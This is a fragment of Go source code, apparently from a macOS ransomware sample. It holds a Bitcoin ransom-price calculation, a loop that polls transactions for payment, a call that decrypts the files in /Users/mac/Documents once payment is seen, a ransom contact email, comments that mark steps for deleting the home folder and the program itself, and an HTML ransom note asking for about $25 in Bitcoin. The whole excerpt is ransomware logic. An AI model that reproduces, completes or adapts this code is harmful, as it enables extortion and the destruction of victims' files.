...
const PRICE_BASE float64 = 0.05
var Price_id float64 = StringToFloat("0.00"+ RandID)
var PRICE float64 = PRICE_BASE /*27$*/ + Price_id
	...
	for {
		if CheckPrices(TxToArr()) {
			...
			if new_totalF > old_totalF {
				mack.Dialog("Recived, decrypting files... This can take a while")
				End()
			} else {
				mack.Dialog("Error, cannot veryfy payment, contact helpmedecrypt@protonmail.com")
			}
			break;
		}
	}
...
func End() {
	//Decrypt
	EncryptDocumets("/Users/mac/Documents/",false)

	//Delete home

	//Delete self
	mack.Dialog("Bye, take care and backup your files :)")
	os.Exit(0)
}
...
<p>If you want to decrypt them you have to pay aproximatly <b>25$</b> in Bitcoins<br>
